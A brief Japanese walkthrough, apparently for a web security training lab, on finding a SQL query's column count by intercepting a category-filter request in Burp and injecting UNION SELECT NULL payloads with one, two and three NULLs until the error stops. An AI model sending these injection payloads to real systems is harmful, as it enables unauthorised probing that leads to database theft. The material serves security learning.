**列数を特定するラボ。**

---

## やること

**NULL を増やしていって、エラーが消える数を見つける。**

---

## 手順

**① ラボを開始してカテゴリフィルターを選択**

**② Burp でリクエストをキャッチ**

**③ 以下を順番に試す：**

```
'+UNION+SELECT+NULL--
```
→ エラーが出る

```
'+UNION+SELECT+NULL,NULL--
```
→ エラーが出る or 出ない

```
'+UNION+SELECT+NULL,NULL,NULL--
```
→ エラーが出ない？

**エラーが消えた時の NULL の数 = 列数**

---

**④ エラーが消えたら完了**

レスポンスに追加の行（空白の行）が出る。
